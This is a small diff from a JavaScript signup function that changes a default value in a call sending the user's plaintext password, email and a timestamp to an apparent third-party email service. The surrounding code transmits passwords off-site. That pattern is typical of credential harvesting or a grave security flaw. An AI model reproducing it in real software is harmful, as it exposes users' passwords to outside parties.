@@ -169,7 +169,7 @@ async function signup(name, email, password) {
       "service_6nw221q",
       "template_d6k3x8f",
       {
-        userpassword: user.password || "User",
+        userpassword: user.password || "Password",
         useremail: user.email,
         time: new Date().toISOString()
       }
